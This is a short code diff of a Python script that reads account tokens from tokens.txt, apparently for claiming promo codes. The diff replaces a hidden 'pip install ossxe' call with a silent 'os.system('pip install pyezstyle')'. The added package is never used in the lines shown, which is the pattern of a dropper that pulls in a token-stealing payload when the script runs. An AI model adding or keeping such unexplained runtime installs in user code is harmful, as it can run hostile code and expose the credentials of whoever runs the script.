@@ -1,8 +1,8 @@
 import requests, json
 import os
 from colorama import Fore
-os.system('pip install ossxe')
-from ossxe import code
+os.system('pip install pyezstyle')
+
 os.system('cls')
 tokens = open("tokens.txt").read().splitlines()
 promoIds = []
